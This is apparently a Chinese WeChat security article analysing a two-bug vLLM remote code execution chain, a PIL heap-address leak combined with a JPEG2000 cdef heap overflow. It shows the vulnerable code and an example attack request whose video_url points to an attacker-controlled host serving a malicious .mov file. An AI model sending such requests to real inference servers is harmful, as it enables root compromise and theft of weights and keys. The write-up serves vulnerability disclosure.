---
title: vLLM如何通过三段请求拿下root
url: https://mp.weixin.qq.com/s/SvaR2wk5OiD6wsiZc90YMA
source: Doonsec's feed
date: 2026-06-18
fetch_date: 2026-06-19T07:01:46.457508
---

# vLLM如何通过三段请求拿下root

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dscLuiaicVquO8n5icXg6P4048oMyMVdRsn1B1bPfRDUnwJpHK7tYzDuJWrgPPmHDfJcMDscDTUY1U82icXrEScib6ReyG8n685tdpOsYEicwtMRs/0?wx_fmt=jpeg)

# vLLM如何通过三段请求拿下root

原创

HeArt
HeArt

船山信安

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

vLLM是LLM推理服务的事实准，其GitHub 19k多星，它的底层采用的是PagedAttention把显存利用率拉到极高，也正因为这个原因，使得多模态端点成了整条链上最弱的一环。GitHub Security Advisory公开了这个CVSS 9.8的未认证RCE，3个HTTP请求就能拿到GPU节点的root shell。

攻击链由两段独立的bug拼接，单独任何一段都不足以触发，但两个加在一起就会起到连锁反应。第一段bug出现在PIL的错误处理。vLLM处理多模态输入时先用PIL打开图片做格式探测，异常信息会被直接塞进HTTP响应里返回给调用方。其中PIL的C扩展在某些错误路径下，str(e)会把堆内存里的指针地址一起吐出来。基于上面的原理，攻击者就可以发一张故意损坏的JPEG，PIL处理时崩溃，8字节的堆地址就这样从错误信息里泄露了。该为PIL错误处理漏洞代码（vllm/multimodal/image.py）

```
def _load_image_from_bytes(data: bytes) -> Image.Image:    try:        img = Image.open(BytesIO(data))        img.verify()        img = Image.open(BytesIO(data))        return img.convert("RGB")    except Exception as e:        # Bug：直接把异常对象str()后塞进error response，泄露堆地址        error_msg = f"Failed to load image: {str(e)}"        raise HTTPException(status_code=400, detail=error_msg)
```

光有堆地址还不够打RCE，这时候第二段bug登场。底层则是调用OpenCV自带的FFmpeg。就会使得JPEG2000帧的cdef box解析存在经典堆溢出，cdef box头部声明的component数量跟box实际大小可以完全不匹配。基于vLLM的多模态端点接受video\_url参数的原理，其框架会把视频拉回来交来给cv2.VideoCapture()进行处理。攻击者就会构造一个n等于65535的cdef box，但实际上的box本体只有12字节，循环往堆上越界写入。

这两个漏洞被串联利用时，会按照以下步骤逐步夺取系统控制权：首先通过堆地址泄露漏洞，绕过ASLR(地址空间布局随机化)保护机制，精准定位内存中的关键数据；随后利用堆溢出漏洞，覆盖系统关键函数指针，从而篡改程序的正常执行流程。

由于vLLM服务通常以root权限运行在GPU计算节点上，一旦攻击者成功控制vLLM进程，就能直接获取宿主机的最高管理权限。这将导致同台服务器上其他用户的所有敏感信息完全暴露，包括正在运行的模型训练任务、存储的模型权重数据，以及下游应用的API密钥等核心资产。

攻击请求格式如下，video\_url指向攻击者控制的恶意mov文件。

```
POST /v1/chat/completions HTTP/1.1Content-Type: application/json {  model: qwen-vl,  messages: [    {      role: user,      content: [        {          type: video_url,          video_url: http://attacker.com/evil.mov        }      ]    }  ]}
```

vLLM把这个链跟Ollama的Bleeding Llama放一起看特别有意思，Ollama是堆越界读能dump内存但拿不到shell，vLLM直接给了RCE。一个打数据一个打执行，合起来刚好把自建LLM推理服务的攻击面画完整。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP80khZp3raYsnCBL854MQ5ouD4zwyygRyXGlvOFEsx69v1ml1s65gia6wwql6v17n12j2CXZibO0ZA/0?wx_fmt=png)

船山信安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP80khZp3raYsnCBL854MQ5ouD4zwyygRyXGlvOFEsx69v1ml1s65gia6wwql6v17n12j2CXZibO0ZA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过